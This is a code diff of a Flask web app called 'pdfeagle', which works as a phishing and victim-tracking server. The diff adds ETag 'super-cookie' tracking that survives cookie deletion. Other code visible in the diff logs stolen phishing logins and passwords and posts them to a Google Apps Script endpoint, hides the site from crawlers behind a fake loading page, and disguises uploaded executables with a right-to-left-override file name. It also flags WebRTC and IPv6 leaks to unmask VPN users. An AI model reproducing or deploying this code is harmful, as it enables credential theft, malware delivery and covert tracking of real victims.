@@ -1,4 +1,3 @@
---- START OF FILE pdfeagle-main/app.py ---
 import os
 import json
 import threading
@@ -10,7 +9,7 @@ from fpdf import FPDF
 
 app = Flask(__name__)
 
-# --- КОНФИГУРАЦИЯ ---
+# --- CONFIGURATION ---
 UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
 DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'
 
@@ -19,13 +18,13 @@ if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
 
-# !!! ЗАМЕНИТЕ НА СВОЙ GOOGLE SCRIPT URL !!!
+# !!! REPLACE WITH YOUR GOOGLE SCRIPT URL !!!
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
-# Хранилище сессий в памяти (для корреляции DNS и HTTP на лету)
+# In-memory session storage for DNS correlation
 active_sessions = {}
 
-# --- БАЗА ДАННЫХ (Файловая) ---
+# --- DATABASE ---
 def load_db():
     if os.path.exists(DB_FILE):
         try:
@@ -43,37 +42,49 @@ db = load_db()
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
-# --- АНАЛИЗАТОР УТЕЧЕК ---
-def analyze_leaks(server_ip, client_data):
-    leaks = []
+# --- GOD-TIER THREAT ANALYZER ---
+def analyze_threats(server_ip, client_data, headers):
+    anomalies = client_data.get('threat', {}).get('anomalies', [])
     
-    # 1. WebRTC Leak (Если WebRTC IP отличается от IP, который видит сервер)
+    # 1. HEADER FORENSICS (Server-Side Bot Detection)
+    ua = headers.get('User-Agent', '').lower()
+    if 'mozilla' in ua:
+        # Real Chrome sends sec-ch-ua headers. Bots often don't.
+        if 'sec-ch-ua' not in headers and 'chrome' in ua:
+            anomalies.append("HEADER: Chrome UA without Sec-CH-UA headers (Possible Bot)")
+        if 'accept-language' not in headers:
+            anomalies.append("HEADER: Missing Accept-Language")
+    
+    # 2. WebRTC Leak Analysis (VPN Check)
     webrtc = client_data.get('network', {}).get('webrtc', {})
-    public_ips = webrtc.get('publicIPv4', []) + webrtc.get('publicIPv6', [])
-    
+    public_ips = webrtc.get('public', [])
     for ip in public_ips:
         if ip != server_ip:
-            leaks.append(f"CRITICAL: WebRTC Leak! Real IP: {ip} (VPN IP: {server_ip})")
+            anomalies.append(f"VPN LEAK: WebRTC IP {ip} != HTTP IP {server_ip}")
 
-    # 2. IPv6 Leak
+    # 3. IPv6 Leak Analysis (Restored)
     ipv6_data = client_data.get('network', {}).get('ipv6', {})
     if ipv6_data.get('detected'):
-        leaks.append(f"HIGH: IPv6 Leak Detected: {ipv6_data.get('ip')}")
+        anomalies.append(f"HIGH: IPv6 Leak Detected: {ipv6_data.get('ip')}")
 
-    # 3. Timezone Mismatch (Гео IP не совпадает с часовым поясом браузера)
-    # Это базовая эвристика, можно улучшить с GeoIP базой
-    tz = client_data.get('timeLocale', {}).get('timezone', 'Unknown')
-    
-    return leaks
+    # 4. Timezone Mismatch (Restored)
+    # Simple heuristic: If browser says 'America/New_York' but IP is RU
+    tz = client_data.get('system', {}).get('timezone', 'Unknown')
+    # (Advanced logic would require a GeoIP database here, but we log the raw data)
 
-# --- ЛОГГЕР ---
-def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", leaks=None):
+    # 5. ETag Persistence Check
+    if client_data.get('fingerprints', {}).get('etag_id'):
+        # This confirms the user has visited before, even if cookies are gone
+        pass 
+
+    return list(set(anomalies)) # Remove duplicates
+
+# --- LOGGER ---
+def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", anomalies=None):
     try:
-        # Лог в консоль Render
         print(f"\n[{datetime.datetime.now()}] TRIGGER: {trigger_type} | IP: {user_ip}")
-        if leaks:
-            for leak in leaks:
-                print(f"  [!] {leak}")
+        if anomalies:
+            for a in anomalies: print(f"  [!] {a}")
         
         if 'system' in data and 'phishing_password' in data['system']:
             print(f"  [!!!] CREDENTIALS: {data['system']['phishing_login']} : {data['system']['phishing_password']}")
@@ -83,14 +94,14 @@ def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", l
             "ip": user_ip,
             "user_agent": user_agent,
             "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "leaks": leaks if leaks else [],
+            "anomalies": anomalies if anomalies else [],
             "details": data
         }
         requests.post(GOOGLE_SCRIPT_URL, json=payload)
     except Exception as e:
         print(f"[-] Logger Error: {e}")
 
-# --- PDF ---
+# --- PDF GENERATOR ---
 class PDFReceipt(FPDF):
     def header(self):
         self.set_font('Arial', 'B', 15)
@@ -104,6 +115,7 @@ def generate_receipt(uid, filename):
     pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
     pdf.set_text_color(255, 0, 0)
     pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
+    # Link to the ETag pixel for tracking
     tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
     pdf.link(0, 0, 210, 297, tracking_url)
     receipt_name = f"receipt_{uid}.pdf"
@@ -115,38 +127,58 @@ def generate_receipt(uid, filename):
 @app.route('/health')
 def health_check(): return "OK", 200
 
-# === WEBHOOK ДЛЯ CANARYTOKENS (СВЯЗКА DNS И HTTP) ===
+# === WEBHOOK FOR CANARYTOKENS ===
 @app.route('/webhook', methods=['POST'])
 def canary_webhook():
     try:
         data = request.json or request.form.to_dict()
-        
-        # Пытаемся достать session_id из hostname (subdomain)
-        # Формат: session_id.ts.rand.token.com
         hostname = data.get('hostname', '') or data.get('additional_data', {}).get('src_ip', '')
         parts = hostname.split('.')
         session_id = parts[0] if len(parts) > 3 else "unknown"
-        
         resolver_ip = data.get('source_ip') or data.get('ip')
         
-        print(f"\n[DNS EVENT] Session: {session_id} | Resolver: {resolver_ip}")
-        
-        # Если сессия активна, добавляем инфо о DNS
         if session_id in active_sessions:
             active_sessions[session_id]['dns_resolver'] = resolver_ip
-            print(f"  [+] Correlated with HTTP Session IP: {active_sessions[session_id]['http_ip']}")
         
         return jsonify({"status": "logged"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "details": str(e)}), 500
+    except: return jsonify({"status": "error"}), 500
 
+# === GOD-TIER TRACKING PIXEL (ETAG SUPER-COOKIE) ===
 @app.route('/pixel.gif')
 def tracking_pixel():
     source = request.args.get('source', 'unknown')
-    uid = request.args.get('uid', 'unknown')
+    
+    # 1. Check for existing Super-Cookie (ETag)
+    client_etag = request.headers.get('If-None-Match')
+    
+    if client_etag:
+        # RETURNING USER (Even if cookies cleared)
+        uid = client_etag.strip('"') # Remove quotes
+        is_returning = True
+    else:
+        # NEW USER
+        uid = request.args.get('uid', uuid.uuid4().hex)
+        is_returning = False
+
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    threading.Thread(target=send_email_background, args=({'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED")).start()
-    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
+    
+    # Log only if it's a significant event (not just page load check)
+    if source != 'etag_check':
+        threading.Thread(target=send_email_background, args=(
+            {'meta': {'url': f'PIXEL TRACK ({uid})', 'source': source}, 'system': {'super_cookie_match': is_returning}}, 
+            ip, "Tracker", "PIXEL FIRED", []
+        )).start()
+
+    # Return 1x1 GIF
+    response = make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
+    response.headers['Content-Type'] = 'image/gif'
+    
+    # SET THE SUPER-COOKIE
+    # Force browser to cache this specific ETag forever
+    response.headers['ETag'] = f'"{uid}"'
+    response.headers['Cache-Control'] = 'private, max-age=31536000, no-transform'
+    
+    return response
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -179,6 +211,7 @@ def view_files(unique_id):
 
 @app.route('/verify/<uid>/<path:filename>')
 def verify_download(uid, filename):
+    # Anti-Bot: If User-Agent is a known bot, show loading forever
     user_agent = request.headers.get('User-Agent', '').lower()
     bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
     if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
@@ -191,6 +224,7 @@ def download_file(uid, filename):
     target_file = next((f for f in data['files'] if f['name'] == filename), None)
     if target_file:
         spoofed_name = target_file['name']
+        # Double extension spoofing for executables
         if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
         return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
     return abort(404)
@@ -203,34 +237,32 @@ def download_receipt(uid):
 @app.route('/api/collect', methods=['POST'])
 def collect_data():
     try:
-        if request.is_json:
-            data = request.json
-        else:
-            data = json.loads(request.data.decode('utf-8'))
+        if request.is_json: data = request.json
+        else: data = json.loads(request.data.decode('utf-8'))
         
-        # Реальный IP через прокси
         forwarded_for = request.headers.get('X-Forwarded-For', '')
-        if forwarded_for:
-            real_ip = forwarded_for.split(',')[0].strip()
-        else:
-            real_ip = request.remote_addr
+        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
 
-        # Сохраняем сессию для корреляции с DNS
+        # Session Correlation
         session_id = data.get('meta', {}).get('sessionId')
         if session_id:
-            active_sessions[session_id] = {
-                'http_ip': real_ip,
-                'timestamp': datetime.datetime.now()
-            }
+            active_sessions[session_id] = {'http_ip': real_ip, 'timestamp': datetime.datetime.now()}
 
-        # Анализ утечек
-        leaks = analyze_leaks(real_ip, data)
+        # GOD-TIER ANALYSIS
+        anomalies = analyze_threats(real_ip, data, request.headers)
+        
+        # Merge client-side anomalies with server-side ones
+        if 'threat' in data and 'anomalies' in data['threat']:
+            anomalies.extend(data['threat']['anomalies'])
         
         user_agent = request.headers.get('User-Agent')
         trigger = data.get('meta', {}).get('trigger', 'Unknown')
         
-        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger, leaks)).start()
-        return jsonify({"status": "ok", "leaks_found": len(leaks)})
+        # Pass empty list [] if anomalies is None to match function signature safely
+        final_anomalies = list(set(anomalies)) if anomalies else []
+        
+        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger, final_anomalies)).start()
+        return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
 
@@ -246,7 +278,7 @@ def add_comment():
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
         
-        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
+        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS", [])).start()
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 404
 
